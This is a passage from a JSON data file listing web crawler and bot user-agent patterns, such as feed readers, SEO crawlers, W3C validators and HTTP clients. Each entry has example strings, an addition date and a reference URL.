      "Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.1; Trident/6.0) SiteCheck-sitecrawl by Siteimprove.com",
      "Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.0) LinkCheck by Siteimprove.com"
    ]
  }
  ,
  {
     "pattern": "BLEXBot\\/",
     "addition_date": "2018/07/07",
     "instances": [
       "Mozilla/5.0 (compatible; BLEXBot/1.0; +http://webmeup-crawler.com/)"
     ],
     "url": "http://webmeup-crawler.com"
  }
  ,
  {
     "pattern": "DareBoost",
     "addition_date": "2018/07/07",
     "instances": [
       "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/62.0.3202.75 Safari/537.36 DareBoost"
     ],
     "url": "https://www.dareboost.com/",
     "description": "Bot to test, Analyze and Optimize website"
  }
  ,
  {
     "pattern": "ZuperlistBot\\/",
     "addition_date": "2018/07/07",
     "instances": [
       "Mozilla/5.0 (compatible; ZuperlistBot/1.0)"
     ]
  }
  ,
  {
     "pattern": "Miniflux\\/",
     "addition_date": "2018/07/07",
     "instances": [
       "Mozilla/5.0 (compatible; Miniflux/2.0.x-dev; +https://miniflux.net)",
       "Mozilla/5.0 (compatible; Miniflux/2.0.3; +https://miniflux.net)",
       "Mozilla/5.0 (compatible; Miniflux/2.0.7; +https://miniflux.net)",
       "Mozilla/5.0 (compatible; Miniflux/2.0.10; +https://miniflux.net)",
       "Mozilla/5.0 (compatibl$; Miniflux/2.0.x-dev; +https://miniflux.app)",
       "Mozilla/5.0 (compatible; Miniflux/2.0.11; +https://miniflux.app)",
       "Mozilla/5.0 (compatible; Miniflux/2.0.12; +https://miniflux.app)",
       "Mozilla/5.0 (compatible; Miniflux/ae1dc1a; +https://miniflux.app)",
       "Mozilla/5.0 (compatible; Miniflux/3b6e44c; +https://miniflux.app)"
     ],
     "url": "https://miniflux.net",
     "description": "Miniflux is a minimalist and opinionated feed reader."
  }
  ,
  {
     "pattern": "Feedspot",
     "addition_date": "2018/07/07",
     "instances": [
       "Mozilla/5.0 (compatible; Feedspotbot/1.0; +http://www.feedspot.com/fs/bot)",
       "Mozilla/5.0 (compatible; Feedspot/1.0 (+https://www.feedspot.com/fs/fetcher; like FeedFetcher-Google)"
     ],
     "url": "http://www.feedspot.com/fs/bot"
  }
  ,
  {
     "pattern": "Diffbot\\/",
     "addition_date": "2018/07/07",
     "instances": [
       "Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.9.1.2) Gecko/20090729 Firefox/3.5.2 (.NET CLR 3.5.30729; Diffbot/0.1; +http://www.diffbot.com)"
     ],
     "url": "http://www.diffbot.com"
  }
  ,
  {
     "pattern": "SEOkicks",
     "addition_date": "2018/08/22",
     "instances": [
       "Mozilla/5.0 (compatible; SEOkicks; +https://www.seokicks.de/robot.html)"
     ],
     "url": "https://www.seokicks.de/robot.html"
  }
  ,
  {
     "pattern": "tracemyfile",
     "addition_date": "2018/08/23",
     "instances": [
       "Mozilla/5.0 (compatible; tracemyfile/1.0; +bot@tracemyfile.com)"
     ]
  }
  ,
  {
     "pattern": "Nimbostratus-Bot",
     "addition_date": "2018/08/29",
     "instances": [
       "Mozilla/5.0 (compatible; Nimbostratus-Bot/v1.3.2; http://cloudsystemnetworks.com)"
     ]
  }
  ,
  {
     "pattern": "zgrab",
     "addition_date": "2018/08/30",
     "instances": [
       "Mozilla/5.0 zgrab/0.x"
     ],
    "url": "https://zmap.io/"
  }
  ,
  {
     "pattern": "PR-CY.RU",
     "addition_date": "2018/08/30",
     "instances": [
       "Mozilla/5.0 (compatible; PR-CY.RU; + https://a.pr-cy.ru)"
     ],
    "url": "https://a.pr-cy.ru/"
  }
  ,
  {
     "pattern": "AdsTxtCrawler",
     "addition_date": "2018/08/30",
     "instances": [
       "AdsTxtCrawler/1.0"
     ]
  },
  {
    "pattern": "Datafeedwatch",
    "addition_date": "2018/09/05",
    "instances": [
      "Datafeedwatch/2.1.x"
    ],
    "url": "https://www.datafeedwatch.com/"
  }
  ,
  {
    "pattern": "Zabbix",
    "addition_date": "2018/09/05",
    "instances": [
      "Zabbix"
    ],
    "url": "https://www.zabbix.com/documentation/3.4/manual/web_monitoring"
  }
  ,
  {
    "pattern": "TangibleeBot",
    "addition_date": "2018/09/05",
    "instances": [
      "TangibleeBot/1.0.0.0 (http://tangiblee.com/bot)"
    ],
    "url": "http://tangiblee.com/bot"
  }
  ,
  {
    "pattern": "google-xrawler",
    "addition_date": "2018/09/05",
    "instances": [
      "google-xrawler"
    ],
    "url": "https://webmasters.stackexchange.com/questions/105560/what-is-the-google-xrawler-user-agent-used-for"
  }
  ,
  {
    "pattern": "axios",
    "addition_date": "2018/09/06",
    "instances": [
      "axios/0.18.0",
      "axios/0.19.0"
    ],
    "url": "https://github.com/axios/axios"
  }
  ,
  {
    "pattern": "Amazon CloudFront",
    "addition_date": "2018/09/07",
    "instances": [
      "Amazon CloudFront"
    ],
    "url": "https://aws.amazon.com/cloudfront/"
  }
  ,
  {
    "pattern": "Pulsepoint",
    "addition_date": "2018/09/24",
    "instances": [
      "Pulsepoint XT3 web scraper"
    ]
  }
  ,
  {
    "pattern": "CloudFlare-AlwaysOnline",
    "addition_date": "2018/09/27",
    "instances": [
      "Mozilla/5.0 (compatible; CloudFlare-AlwaysOnline/1.0; +http://www.cloudflare.com/always-online) AppleWebKit/534.34",
      "Mozilla/5.0 (compatible; CloudFlare-AlwaysOnline/1.0; +https://www.cloudflare.com/always-online) AppleWebKit/534.34"
    ],
    "url" : "https://www.cloudflare.com/always-online/"
  }
  ,
  {
   "pattern": "Google-Structured-Data-Testing-Tool",
    "addition_date": "2018/10/02",
    "instances": [
      "Mozilla/5.0 (compatible; Google-Structured-Data-Testing-Tool +https://search.google.com/structured-data/testing-tool)",
      "Mozilla/5.0 (compatible; Google-Structured-Data-Testing-Tool +http://developers.google.com/structured-data/testing-tool/)"
    ],
    "url": "https://search.google.com/structured-data/testing-tool"
  }
  ,
  {
   "pattern": "WordupInfoSearch",
    "addition_date": "2018/10/07",
    "instances": [
      "WordupInfoSearch/1.0"
    ]
  }
  ,
  {
    "pattern": "WebDataStats",
    "addition_date": "2018/10/08",
    "instances": [
      "Mozilla/5.0 (compatible; WebDataStats/1.0 ; +https://webdatastats.com/policy.html)"
    ],
    "url": "https://webdatastats.com/"
  }
  ,
  {
    "pattern": "HttpUrlConnection",
    "addition_date": "2018/10/08",
    "instances": [
      "Jersey/2.25.1 (HttpUrlConnection 1.8.0_141)"
    ]
  }
  ,
  {
    "pattern": "Seekport Crawler",
    "addition_date": "2018/10/08",
    "instances": [
      "Mozilla/5.0 (compatible; Seekport Crawler; http://seekport.com/)"
    ],
    "url": "http://seekport.com/"
  }
  ,
  {
    "pattern": "ZoomBot",
    "addition_date": "2018/10/10",
    "instances": [
      "ZoomBot (Linkbot 1.0 http://suite.seozoom.it/bot.html)"
    ],
    "url": "http://suite.seozoom.it/bot.html"
  }
  ,
  {
    "pattern": "VelenPublicWebCrawler",
    "addition_date": "2018/10/09",
    "instances": [
      "VelenPublicWebCrawler (velen.io)"
    ]
  }
  ,
  {
    "pattern": "MoodleBot",
    "addition_date": "2018/10/10",
    "instances": [
      "MoodleBot/1.0"
    ]
  }
  ,
  {
    "pattern": "jpg-newsbot",
    "addition_date": "2018/10/10",
    "instances": [
      "jpg-newsbot/2.0; (+https://vipnytt.no/bots/)"
    ],
    "url": "https://vipnytt.no/bots/"
  }
  ,
  {
    "pattern": "outbrain",
    "addition_date": "2018/10/14",
    "instances": [
      "Mozilla/5.0 (Java) outbrain"
    ],
    "url": "https://www.outbrain.com/help/advertisers/invalid-url/"
  }
  ,
  {
    "pattern": "W3C_Validator",
    "addition_date": "2018/10/14",
    "instances": [
      "W3C_Validator/1.3"
    ],
    "url": "https://validator.w3.org/services"
  }
  ,
  {
    "pattern": "Validator\\.nu",
    "addition_date": "2018/10/14",
    "instances": [
      "Validator.nu/LV"
    ],
    "url": "https://validator.w3.org/services"
  }
  ,
  {
    "pattern": "W3C-checklink",
    "addition_date": "2018/10/14",
    "depends_on": ["libwww-perl"],
    "instances": [
      "W3C-checklink/2.90 libwww-perl/5.64",
      "W3C-checklink/3.6.2.3 libwww-perl/5.64",
      "W3C-checklink/4.2 [4.20] libwww-perl/5.803",
      "W3C-checklink/4.2.1 [4.21] libwww-perl/5.803",
      "W3C-checklink/4.3 [4.42] libwww-perl/5.805",
      "W3C-checklink/4.3 [4.42] libwww-perl/5.808",
      "W3C-checklink/4.3 [4.42] libwww-perl/5.820",
      "W3C-checklink/4.5 [4.154] libwww-perl/5.823",
      "W3C-checklink/4.5 [4.160] libwww-perl/5.823"
    ],
    "url": "https://validator.w3.org/services"
  }
  ,
  {
    "pattern": "W3C-mobileOK",
    "addition_date": "2018/10/14",
    "instances": [
      "W3C-mobileOK/DDC-1.0"
    ],
    "url": "https://validator.w3.org/services"
  }
  ,
  {
    "pattern": "W3C_I18n-Checker",
    "addition_date": "2018/10/14",
    "instances": [
      "W3C_I18n-Checker/1.0"
    ],
    "url": "https://validator.w3.org/services"
  }
  ,
  {
    "pattern": "FeedValidator",
    "addition_date": "2018/10/14",
    "instances": [
      "FeedValidator/1.3"
    ],
    "url": "https://validator.w3.org/services"
  }
  ,
  {
    "pattern": "W3C_CSS_Validator",
    "addition_date": "2018/10/14",
    "instances": [
      "Jigsaw/2.3.0 W3C_CSS_Validator_JFouffa/2.0"
    ],
    "url": "https://validator.w3.org/services"
  }
  ,
  {
    "pattern": "W3C_Unicorn",
    "addition_date": "2018/10/14",
    "instances": [
      "W3C_Unicorn/1.0"
    ],
    "url": "https://validator.w3.org/services"
  }
  ,
  {
    "pattern": "Google-PhysicalWeb",
    "addition_date": "2018/10/21",
    "instances": [
      "Mozilla/5.0 (Google-PhysicalWeb)"
    ]
  }
  ,
  {
    "pattern": "Blackboard",
    "addition_date": "2018/10/28",
    "instances": [
      "Blackboard Safeassign"
    ],
    "url": "https://help.blackboard.com/Learn/Administrator/Hosting/Tools_Management/SafeAssign"
  },
  {
    "pattern": "ICBot\\/",
    "addition_date": "2018/10/23",
    "instances": [
      "Mozilla/5.0 (compatible; ICBot/0.1; +https://ideasandcode.xyz"
    ],
    "url": "https://ideasandcode.xyz"
  },
  {
    "pattern": "BazQux",
    "addition_date": "2018/10/23",
    "instances": [
      "Mozilla/5.0 (compatible; BazQux/2.4; +https://bazqux.com/fetcher; 1 subscribers)"
    ],
    "url": "https://bazqux.com/fetcher"
  },
  {
    "pattern": "Twingly",
    "addition_date": "2018/10/23",
    "instances": [
      "Mozilla/5.0 (compatible; Twingly Recon; twingly.com)"
    ],
    "url": "https://twingly.com"
  },
  {
    "pattern": "Rivva",
    "addition_date": "2018/10/23",
    "instances": [
      "Mozilla/5.0 (compatible; Rivva; http://rivva.de)"
    ],
    "url": "http://rivva.de"
  },
  {
    "pattern": "Experibot",
    "addition_date": "2018/11/03",
    "instances": [
      "Experibot-v2 http://goo.gl/ZAr8wX",
      "Experibot-v3 http://goo.gl/ZAr8wX"
    ],
    "url": "https://amirkr.wixsite.com/experibot"
  },
  {
    "pattern": "awesomecrawler",
    "addition_date": "2018/11/24",
    "instances": [
      "Mozilla/5.0 (Windows NT 6.2; WOW64) AppleWebKit/537.22 (KHTML, like Gecko) Chrome/25.0.1364.5 Safari/537.22 +awesomecrawler"
    ]
  },
  {
    "pattern": "Dataprovider.com",
    "addition_date": "2018/11/24",
    "instances": [
      "Mozilla/5.0 (compatible; Dataprovider.com)"
    ],
    "url": "https://www.dataprovider.com/"
  },
  {
    "pattern": "GroupHigh\\/",
    "addition_date": "2018/11/24",
    "instances": [
      "Mozilla/5.0 (compatible; GroupHigh/1.0; +http://www.grouphigh.com/"
    ],
    "url": "http://www.grouphigh.com/"
  },
  {
    "pattern": "theoldreader.com",
    "addition_date": "2018/12/02",
    "instances": [
      "Mozilla/5.0 (compatible; theoldreader.com)"
    ],
    "url": "https://www.theoldreader.com/"
  }
  ,
  {
    "pattern": "AnyEvent",
    "addition_date": "2018/12/07",
    "instances": [
      "Mozilla/5.0 (compatible; U; AnyEvent-HTTP/2.24; +http://software.schmorp.de/pkg/AnyEvent)"
    ],
    "url": "http://software.schmorp.de/pkg/AnyEvent.html"
  }
  ,
  {
    "pattern": "Uptimebot\\.org",
    "addition_date": "2019/01/17",
    "instances": [
      "Uptimebot.org - Free website monitoring"
    ],
    "url": "http://uptimebot.org/"
  }
  ,
  {
    "pattern": "Nmap Scripting Engine",
    "addition_date": "2019/02/04",
    "instances": [
      "Mozilla/5.0 (compatible; Nmap Scripting Engine; https://nmap.org/book/nse.html)"
    ],
    "url": "https://nmap.org/book/nse.html"
  }
  ,
  {
    "pattern": "2ip.ru",
    "addition_date": "2019/02/12",
    "instances": [
      "2ip.ru CMS Detector (https://2ip.ru/cms/)"
    ],
    "url": "https://2ip.ru/cms/"
  },
  {
    "pattern": "Clickagy",
    "addition_date": "2019/02/19",
    "instances": [
      "Clickagy Intelligence Bot v2"
    ],
    "url": "https://www.clickagy.com"
  },
  {
    "pattern": "Caliperbot",
    "addition_date": "2019/03/02",
    "instances": [
      "Caliperbot/1.0 (+http://www.conductor.com/caliperbot)"
    ],
    "url": "http://www.conductor.com/caliperbot"
  },
  {
    "pattern": "MBCrawler",
    "addition_date": "2019/03/02",
    "instances": [
      "MBCrawler/1.0 (https://monitorbacklinks.com)"
    ],
    "url": "https://monitorbacklinks.com"
  },
  {
    "pattern": "online-webceo-bot",
    "addition_date": "2019/03/02",
    "instances": [
      "Mozilla/5.0 (compatible; online-webceo-bot/1.0; +http://online.webceo.com)"
    ],
    "url": "http://online.webceo.com"
  },
  {
    "pattern": "B2B Bot",
    "addition_date": "2019/03/02",
    "instances": [
      "B2B Bot"
    ]
  },
  {
    "pattern": "AddSearchBot",
    "addition_date": "2019/03/02",
    "instances": [
      "Mozilla/5.0 (compatible; AddSearchBot/0.9; +http://www.addsearch.com/bot; info@addsearch.com)"
    ],
    "url": "http://www.addsearch.com/bot"
  },
  {
    "pattern": "Google Favicon",
    "addition_date": "2019/03/14",
    "instances": [
      "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/49.0.2623.75 Safari/537.36 Google Favicon"
    ]
  },
  {
    "pattern": "HubSpot",
    "addition_date": "2019/04/15",
    "instances": [
      "Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/27.0.1453.116 Safari/537.36 HubSpot Webcrawler - web-crawlers@hubspot.com",
      "Mozilla/5.0 (X11; Linux x86_64; HubSpot Single Page link check; web-crawlers+links@hubspot.com) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.103 Safari/537.36",
      "Mozilla/5.0 (compatible; HubSpot Crawler; web-crawlers@hubspot.com)",
      "HubSpot Connect 2.0 (http://dev.hubspot.com/) - BizOpsCompanies-Tq2-BizCoDomainValidationAudit"
    ]
  },
  {
    "pattern": "Chrome-Lighthouse",
    "addition_date": "2019/03/15",
    "instances": [
      "Mozilla/5.0 (Linux; Android 6.0.1; Nexus 5 Build/MRA58N) AppleWebKit/537.36(KHTML, like Gecko) Chrome/69.0.3464.0 Mobile Safari/537.36 Chrome-Lighthouse",
      "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36(KHTML, like Gecko) Chrome/69.0.3464.0 Safari/537.36 Chrome-Lighthouse",
      "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3694.0 Safari/537.36 Chrome-Lighthouse",
      "Mozilla/5.0 (Linux; Android 6.0.1; Nexus 5 Build/MRA58N) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3694.0 Mobile Safari/537.36 Chrome-Lighthouse"
    ],
    "url": "https://developers.google.com/speed/pagespeed/insights"
  },
  {
    "pattern": "HeadlessChrome",
    "url": "https://developers.google.com/web/updates/2017/04/headless-chrome",
    "addition_date": "2019/06/17",
    "instances": [
        "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) HeadlessChrome/74.0.3729.169 Safari/537.36",
        "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) HeadlessChrome/69.0.3494.0 Safari/537.36",
        "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) HeadlessChrome/76.0.3803.0 Safari/537.36"
    ]
  },
  {
    "pattern": "CheckMarkNetwork\\/",
    "addition_date": "2019/06/30",
    "instances": [
      "CheckMarkNetwork/1.0 (+http://www.checkmarknetwork.com/spider.html)"
    ],
    "url": "https://www.checkmarknetwork.com/"
  },
  {
    "pattern": "www\\.uptime\\.com",
    "addition_date": "2019/07/21",
    "instances": [
      "Mozilla/5.0 (compatible; Uptimebot/1.0; +http://www.uptime.com/uptimebot)"
    ],
    "url": "http://www.uptime.com/uptimebot"
  }
  ,
  {
    "pattern": "Streamline3Bot\\/",
    "addition_date": "2019/07/21",
    "instances": [
      "Mozilla/5.0 (compatible; MSIE 8.0; Windows NT 5.1) Streamline3Bot/1.0",
      "Mozilla/5.0 (Windows NT 6.1; Win64; x64; +https://www.ubtsupport.com/legal/Streamline3Bot.php) Streamline3Bot/1.0"
    ],
    "url": "https://www.ubtsupport.com/legal/Streamline3Bot.php"
  }
  ,
  {
    "pattern": "serpstatbot\\/",
    "addition_date": "2019/07/25",
    "instances": [
      "serpstatbot/1.0 (advanced backlink tracking bot; http://serpstatbot.com/; abuse@serpstatbot.com)",
      "serpstatbot/1.0 (advanced backlink tracking bot; curl/7.58.0; http://serpstatbot.com/; abuse@serpstatbot.com)"
    ],
    "url": "http://serpstatbot.com"
  }
  ,
  {
    "pattern": "MixnodeCache\\/",
    "addition_date": "2019/08/04",
    "instances": [
      "MixnodeCache/1.8(+https://cache.mixnode.com/)"
    ],
    "url": "https://cache.mixnode.com/"
  }
  ,
  {
    "pattern": "^curl",
    "addition_date": "2019/08/15",
    "instances": [
      "curl",
      "curl/7.29.0",
      "curl/7.47.0",
      "curl/7.54.0",
      "curl/7.55.1",
      "curl/7.64.0",
      "curl/7.64.1",
      "curl/7.65.3"
    ],
    "url": "https://curl.haxx.se/"
  }
  ,
  {
    "pattern": "SimpleScraper",
    "addition_date": "2019/08/16",
    "instances": [
      "Mozilla/5.0 (compatible; SimpleScraper)"
    ],
    "url": "https://github.com/ramonkcom/simple-scraper/"
  }
  ,
  {
    "pattern": "RSSingBot",
    "addition_date": "2019/09/15",
    "instances": [
      "RSSingBot (http://www.rssing.com)"
    ],
    "url": "http://www.rssing.com"
  }
  ,
  {
    "pattern": "Jooblebot",
    "addition_date": "2019/09/25",
    "instances": [
      "Mozilla/5.0 (compatible; Jooblebot/2.0; Windows NT 6.1; WOW64; +http://jooble.org/jooble-bot) AppleWebKit/537.36 (KHTML, like Gecko) Safari/537.36"
    ],
    "url": "http://jooble.org/jooble-bot"
  }
  ,
  {
    "pattern": "fedoraplanet",
    "addition_date": "2019/09/28",
    "instances": [
      "venus/fedoraplanet"
    ],
    "url": "http://fedoraplanet.org/"
  }
  ,
  {
    "pattern": "Friendica",
    "addition_date": "2019/09/28",
    "instances": [
      "Friendica 'The Tazmans Flax-lily' 2019.01-1293; https://hoyer.xyz"
    ],
    "url": "https://hoyer.xyz"
  }
  ,
  {
    "pattern": "NextCloud",
    "addition_date": "2019/09/30",
    "instances": [
      "NextCloud-News/1.0"
    ],
    "url": "https://nextcloud.com/"
  }
  ,
  {
    "pattern": "Tiny Tiny RSS",
    "addition_date": "2019/10/04",
    "instances": [
      "Tiny Tiny RSS/1.15.3 (http://tt-rss.org/)",
      "Tiny Tiny RSS/17.12 (a2d1fa5) (http://tt-rss.org/)",
      "Tiny Tiny RSS/19.2 (b68db2d) (http://tt-rss.org/)",
      "Tiny Tiny RSS/19.8 (http://tt-rss.org/)"
    ],
    "url": "http://tt-rss.org/"
  }
  ,
  {
    "pattern": "RegionStuttgartBot",
    "addition_date": "2019/10/17",
    "instances": [
      "Mozilla/5.0 (compatible; RegionStuttgartBot/1.0; +http://it.region-stuttgart.de/competenzatlas/unternehmen-suchen/)"
    ],
    "url": "http://it.region-stuttgart.de/competenzatlas/unternehmen-suchen/"
  }
  ,
  {
    "pattern": "Bytespider",
    "addition_date": "2019/11/11",
    "instances": [
        "Mozilla/5.0 (iPhone; CPU iPhone OS 11_0 like Mac OS X) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/40.0.3754.1902 Mobile Safari/537.36; Bytespider",
        "Mozilla/5.0 (iPhone; CPU iPhone OS 11_0 like Mac OS X) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.4454.1745 Mobile Safari/537.36; Bytespider",
        "Mozilla/5.0 (iPhone; CPU iPhone OS 11_0 like Mac OS X) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.7597.1164 Mobile Safari/537.36; Bytespider;bytespider@bytedance.com",
        "Mozilla/5.0 (iPhone; CPU iPhone OS 11_0 like Mac OS X) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/46.0.2988.1545 Mobile Safari/537.36; Bytespider",
        "Mozilla/5.0 (iPhone; CPU iPhone OS 11_0 like Mac OS X) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.4141.1682 Mobile Safari/537.36; Bytespider",
        "Mozilla/5.0 (iPhone; CPU iPhone OS 11_0 like Mac OS X) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/54.0.3478.1649 Mobile Safari/537.36; Bytespider",
        "Mozilla/5.0 (Linux; Android 5.0; SM-G900P Build/LRX21T) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/47.0.5267.1259 Mobile Safari/537.36; Bytespider",
        "Mozilla/5.0 (Linux; Android 5.0; SM-G900P Build/LRX21T) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.7990.1979 Mobile Safari/537.36; Bytespider",
        "Mozilla/5.0 (Linux; Android 5.0; SM-G900P Build/LRX21T) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.2268.1523 Mobile Safari/537.36; Bytespider",
        "Mozilla/5.0 (Linux; Android 6.0; Nexus 5 Build/MRA58N) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/40.0.2576.1836 Mobile Safari/537.36; Bytespider",
        "Mozilla/5.0 (Linux; Android 6.0; Nexus 5 Build/MRA58N) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.9681.1227 Mobile Safari/537.36; Bytespider",
        "Mozilla/5.0 (Linux; Android 6.0; Nexus 5 Build/MRA58N) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/44.0.6023.1635 Mobile Safari/537.36; Bytespider",
        "Mozilla/5.0 (Linux; Android 6.0; Nexus 5 Build/MRA58N) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/50.0.4944.1981 Mobile Safari/537.36; Bytespider",
        "Mozilla/5.0 (Linux; Android 6.0; Nexus 5 Build/MRA58N) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.3613.1739 Mobile Safari/537.36; Bytespider",
        "Mozilla/5.0 (Linux; Android 6.0; Nexus 5 Build/MRA58N) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.4022.1033 Mobile Safari/537.36; Bytespider",
        "Mozilla/5.0 (Linux; Android 6.0; Nexus 5 Build/MRA58N) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/52.0.3248.1547 Mobile Safari/537.36; Bytespider",
        "Mozilla/5.0 (Linux; Android 6.0; Nexus 5 Build/MRA58N) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/57.0.5527.1507 Mobile Safari/537.36; Bytespider",
        "Mozilla/5.0 (Linux; Android 8.0; Pixel 2 Build/OPD3.170816.012) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/54.0.5216.1326 Mobile Safari/537.36; Bytespider",
        "Mozilla/5.0 (Linux; Android 8.0; Pixel 2 Build/OPD3.170816.012) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.9038.1080 Mobile Safari/537.36; Bytespider"
    ],
    "url": "https://stackoverflow.com/questions/57908900/what-is-the-bytespider-user-agent"
  }
  ,
  {
    "pattern": "Datanyze",
    "addition_date": "2019/11/17",
    "instances": [
      "Mozilla/5.0 (X11; Datanyze; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.181 Safari/537.36"
    ],
    "url": "https://www.datanyze.com/dnyzbot/"
  }
  ,
  {
    "pattern": "Google-Site-Verification",
    "addition_date": "2019/12/11",
    "instances": [
      "Mozilla/5.0 (compatible; Google-Site-Verification/1.0)"
    ],
    "url": "https://support.google.com/webmasters/answer/9008080"
  }
  ,
  {
    "pattern": "TrendsmapResolver",
    "addition_date": "2020/02/24",
    "instances": [
      "Mozilla/5.0 (compatible; TrendsmapResolver/0.1)"
    ],
    "url": "https://www.trendsmap.com/"
  }
  ,
  {
    "pattern": "tweetedtimes",
    "addition_date": "2020/02/24",
    "instances": [
      "Mozilla/5.0 (compatible; +http://tweetedtimes.com)"
    ],
    "url": "https://tweetedtimes.com/"
  },
  {
    "pattern": "NTENTbot",
    "addition_date": "2020/02/24",
    "instances": [
      "Mozilla/5.0 (compatible; NTENTbot; +http://www.ntent.com/ntentbot)"
    ],
    "url": "https://ntent.com/ntentbot/"
  },
  {
    "pattern": "Gwene",
    "addition_date": "2020/02/24",
    "instances": [
      "Gwene/1.0 (The gwene.org rss-to-news gateway) Googlebot"
    ],
    "url": "https://gwene.org"
  },
  {
    "pattern": "SimplePie",
    "addition_date": "2020/02/24",
    "instances": [
      "SimplePie/1.3-dev (Feed Parser; http://simplepie.org; Allow like Gecko)"
    ],
    "url": "http://simplepie.org"
  },
  {
    "pattern": "SearchAtlas",
    "addition_date": "2020/03/02",
    "instances": [
      "SearchAtlas.com SEO Crawler"
    ],
    "url": "http://SearchAtlas.com"
  },
  {
    "pattern": "Superfeedr",
    "addition_date": "2020/03/02",
    "instances": [
      "Superfeedr bot/2.0 http://superfeedr.com - Make your feeds realtime: get in touch - feed-id:1162088860"
    ],
    "url": "http://superfeedr.com"
  },
  {
    "pattern": "feedbot",
    "addition_date": "2020/03/02",
    "instances": [
      "wp.com feedbot/1.0 (+https://wp.com)"
    ],
    "url": "http://wp.com"
  },
  {
    "pattern": "UT-Dorkbot",
    "addition_date": "2020/03/02",
    "instances": [
      "UT-Dorkbot/1.0"
    ],
    "url": "https://security.utexas.edu/dorkbot"
  },
  {
    "pattern": "Amazonbot",
    "addition_date": "2020/03/02",
    "instances": [
      "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_1) AppleWebKit/600.2.5 (KHTML, like Gecko) Version/8.0.2 Safari/600.2.5 (Amazonbot/0.1; +https://developer.amazon.com/support/amazonbot)"
    ],
    "url": "https://developer.amazon.com/support/amazonbot"
  },
  {
    "pattern": "SerendeputyBot",
    "addition_date": "2020/03/02",
    "instances": [
      "SerendeputyBot/0.8.6 (http://serendeputy.com/about/serendeputy-bot)"
    ],
    "url": "http://serendeputy.com/about/serendeputy-bot"
  },
  {
    "pattern": "Eyeotabot",
    "addition_date": "2020/03/02",
    "instances": [
      "Mozilla/5.0 (compatible; Eyeotabot/1.0; +http://www.eyeota.com)"
    ],
    "url": "http://www.eyeota.com"
  },
  {
    "pattern": "officestorebot",
    "addition_date": "2020/03/02",
    "instances": [
      "Mozilla/5.0 (compatible; officestorebot/1.0; +https://aka.ms/officestorebot)"
    ],
    "url": "https://aka.ms/officestorebot"
  },
  {
    "pattern": "Neticle Crawler",
    "addition_date": "2020/03/02",
    "instances": [
      "Neticle Crawler v1.0 ( https://neticle.com/bot/en/ )"
    ],
    "url": "https://neticle.com/bot/en/"
  },
  {
    "pattern": "SurdotlyBot",
    "addition_date": "2020/03/02",
    "instances": [
      "Mozilla/5.0 (compatible; SurdotlyBot/1.0; +http://sur.ly/bot.html; Linux; Android 4; iPhone; CPU iPhone OS 6_0_1 like Mac OS X)"
    ],
    "url": "http://sur.ly/bot.html"
  },
  {
    "pattern": "LinkisBot",
    "addition_date": "2020/03/02",
    "instances": [
      "Mozilla/5.0 (compatible; LinkisBot/1.0; bot@linkis.com) (iPhone; CPU iPhone OS 8_4_1 like Mac OS X) Mobile/12H321"
    ]
  },
  {
    "pattern": "AwarioSmartBot",
    "addition_date": "2020/03/02",
    "instances": [
      "AwarioSmartBot/1.0 (+https://awario.com/bots.html; bots@awario.com)"
    ],
    "url": "https://awario.com/bots.html"
  },
  {
    "pattern": "AwarioRssBot",
    "addition_date": "2020/03/02",
    "instances": [
      "AwarioRssBot/1.0 (+https://awario.com/bots.html; bots@awario.com)"
    ],
    "url": "https://awario.com/bots.html"
  },
  {
    "pattern": "RyteBot",
    "addition_date": "2020/03/02",
    "instances": [
      "RyteBot/1.0.0 (+https://bot.ryte.com/)"
    ],
    "url": "https://bot.ryte.com/"
  },
  {
    "pattern": "FreeWebMonitoring SiteChecker",
    "addition_date": "2020/03/02",
    "instances": [
      "FreeWebMonitoring SiteChecker/0.2 (+https://www.freewebmonitoring.com/bot.html)"
    ],
    "url": "https://www.freewebmonitoring.com/bot.html"
  },
  {
    "pattern": "AspiegelBot",
    "addition_date": "2020/03/16",
    "instances": [
      "Mozilla/5.0 (Linux; Android 7.0;) AppleWebKit/537.36 (KHTML, like Gecko) Mobile Safari/537.36 (compatible; AspiegelBot)"
    ],
    "url": "https://aspiegel.com"
  },
  {
    "pattern": "NAVER Blog Rssbot",
    "addition_date": "2020/03/16",
    "instances": [
      "NAVER Blog Rssbot"
    ],
    "url": "http://www.naver.com"
  },
  {
    "pattern": "zenback bot",
    "addition_date": "2020/03/16",
    "instances": [
